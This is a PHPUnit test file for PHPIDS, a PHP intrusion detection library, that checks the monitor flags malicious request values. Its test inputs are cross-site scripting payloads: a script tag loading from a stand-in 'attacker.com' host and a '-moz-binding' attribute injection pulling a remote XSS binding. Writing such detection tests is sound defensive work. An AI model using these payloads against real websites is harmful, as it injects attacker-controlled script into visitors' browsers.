<?php

/**
 * PHP IDS
 *
 * Requirements: PHP5, SimpleXML, MultiByte Extension (optional)
 *
 * Copyright (c) 2007 PHPIDS (http://php-ids.org)
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2 of the license.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 */

require_once 'PHPUnit2/Framework/TestCase.php';
set_include_path(get_include_path() . PATH_SEPARATOR . dirname(__FILE__) . '/../../../lib');
require_once 'IDS/Monitor.php';
require_once 'IDS/Filter/Storage.php';

class IDS_Monitor_TestCase extends PHPUnit2_Framework_TestCase {

	public function setUp()
	{
		$this->storage = new IDS_Filter_Storage();
		$this->storage->getFilterFromXML(dirname(__FILE__) . '/../../../lib/default_filter.xml');
	}

	public function testRunWithTags() {
		$test = new IDS_Monitor(
			array('user' => 'admin<script/src=http/attacker.com>'),
			$this->storage,
			array('csrf')
		);

		$result = $test->run();

		foreach ($result->getEvent('user')->getFilters() as $filter) {
			$this->assertTrue(in_array('csrf', $filter->getTags()));
		}
	}

	public function testRun() {
		$test = new IDS_Monitor(
			array(
				'id' 	=> '9<script/src=http/attacker.com>',
				'name' 	=> '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'
			),
			$this->storage
		);

		$result = $test->run();

		$this->assertTrue($result->hasEvent('id'));
		$this->assertTrue($result->hasEvent('name'));
	}

	public function testList()
	{
		$test = new IDS_Monitor(
			array('9<script/src=http/attacker.com>', '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'),
			$this->storage
		);
		$result = $test->run();
		$this->assertTrue($result->hasEvent(1));
		$this->assertEquals(6, $result->getImpact());
	}

}
